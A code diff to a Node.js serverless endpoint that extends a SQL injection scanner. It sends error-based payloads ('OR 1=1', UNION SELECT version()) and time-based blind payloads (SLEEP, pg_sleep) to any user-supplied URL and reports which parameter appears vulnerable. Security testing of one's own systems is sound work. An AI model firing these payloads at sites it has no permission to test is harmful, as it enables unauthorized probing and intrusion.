@@ -16,6 +16,23 @@ const axiosInstance = axios.create({
     }
 });
 
+// 延时函数
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+async function checkTimeBasedInjection(baseUrl, param, payload) {
+    const start = Date.now();
+    const testUrl = new URL(baseUrl);
+    testUrl.searchParams.set(param, payload);
+    try {
+        await axiosInstance.get(testUrl.href, { timeout: 10000 });
+        const elapsed = Date.now() - start;
+        // 如果响应时间超过 5 秒，认为可能存在时间盲注
+        return elapsed > 5000;
+    } catch (e) {
+        return false;
+    }
+}
+
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -28,20 +45,41 @@ module.exports = async (req, res) => {
     let targetUrl = url;
     if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;
 
-    const payload = "' OR '1'='1";
+    const errorPayloads = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' UNION SELECT NULL, version()--",
+        "' AND 1=CONVERT(int, @@version)--"
+    ];
+    const timePayloads = [
+        "' AND SLEEP(5)--",
+        "'; SELECT pg_sleep(5)--",
+        "' AND 1=IF(1, SLEEP(5), 0)--"
+    ];
+
     for (const param of rules.sqlParams) {
-        const testUrl = new URL(targetUrl);
-        testUrl.searchParams.set(param, payload);
-        try {
-            const res = await axiosInstance.get(testUrl.href);
-            const errorKeywords = ['sql', 'mysql', 'syntax', 'unclosed'];
-            const hasError = errorKeywords.some(k => res.data.toLowerCase().includes(k));
-            if (hasError) {
-                return res.json({ vulnerable: true, param, url: testUrl.href });
+        // 错误注入检测
+        for (const payload of errorPayloads) {
+            const testUrl = new URL(targetUrl);
+            testUrl.searchParams.set(param, payload);
+            try {
+                const resData = await axiosInstance.get(testUrl.href);
+                const errorKeywords = ['sql', 'mysql', 'syntax', 'unclosed', 'warning', 'ora-', 'microsoft ole db'];
+                if (errorKeywords.some(k => resData.data.toLowerCase().includes(k))) {
+                    return res.json({ vulnerable: true, param, url: testUrl.href, note: 'SQL error detected' });
+                }
+            } catch (e) {
+                if (e.response && e.response.status >= 500) {
+                    return res.json({ vulnerable: true, param, url: testUrl.href, note: 'Server error likely caused by injection' });
+                }
             }
-        } catch (e) {
-            if (e.response && e.response.status >= 500) {
-                return res.json({ vulnerable: true, param, url: testUrl.href, note: 'Server error likely caused by injection' });
+        }
+
+        // 时间盲注检测（仅测一个 payload，避免超时）
+        for (const payload of timePayloads.slice(0, 1)) {
+            const isVuln = await checkTimeBasedInjection(targetUrl, param, payload);
+            if (isVuln) {
+                return res.json({ vulnerable: true, param, url: new URL(targetUrl).href + `?${param}=${encodeURIComponent(payload)}`, note: 'Time-based blind SQL injection detected' });
             }
         }
     }
